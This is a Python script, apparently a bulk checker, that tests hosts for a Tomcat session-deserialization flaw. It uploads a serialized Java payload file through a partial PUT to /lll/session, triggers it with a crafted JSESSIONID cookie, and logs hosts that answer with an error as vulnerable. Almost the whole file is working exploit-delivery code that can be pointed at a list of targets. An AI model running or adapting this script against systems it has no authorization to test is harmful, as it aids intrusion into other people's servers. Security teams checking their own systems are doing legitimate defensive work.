# -*- coding: utf-8 -*-
import requests
import argparse
payload = open("URLDNS.bin", "rb").read()

def check_target(host, port):
    url = f"http://{host}:{port}/lll/session"
    try:
        put_resp = requests.put(
            url,
            headers={"Content-Range": "bytes 0-10000/12000"},
            data=payload,
            verify=False,
            timeout=10
        )

        if put_resp.status_code == 409:
            get_resp = requests.get(
                url,
                headers={"Cookie": "JSESSIONID=.lll"},
                verify=False,
                timeout=10
            )

            if get_resp.status_code == 500:
                print(f"[!!!] 漏洞存在: {host}:{port}")
                return True

        print(f"[+] 未发现漏洞: {host}:{port}")
        return False

    except Exception as e:
        print(f"[!] 检测失败: {host}:{port} - {e}")
        return False

def run_check(targets):
    found = []
    for target in targets:
        if ":" not in target:
            print(f"[!] 格式错误: {target}")
            continue
        host, port = target.split(":")
        if check_target(host.strip(), port.strip()):
            found.append(target)

    print("\n[*] 检测完成")
    if found:
        print("[*] 存在漏洞的目标：")
        for t in found:
            print(t)
        with open("vulnerable.txt", "w") as f:
            for t in found:
                f.write(t + "\n")
    else:
        print("[*] 未发现任何目标存在漏洞")

def main():
    parser = argparse.ArgumentParser(description="批量检测 URLDNS 漏洞")
    parser.add_argument("-u", "--url", help="指定单个目标，例如 127.0.0.1:8080")
    parser.add_argument("-f", "--file", help="目标文件，每行一个 IP:端口")

    args = parser.parse_args()

    if args.url:
        run_check([args.url])
    elif args.file:
        try:
            with open(args.file, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
            run_check(targets)
        except Exception as e:
            print(f"[!] 无法读取文件: {e}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
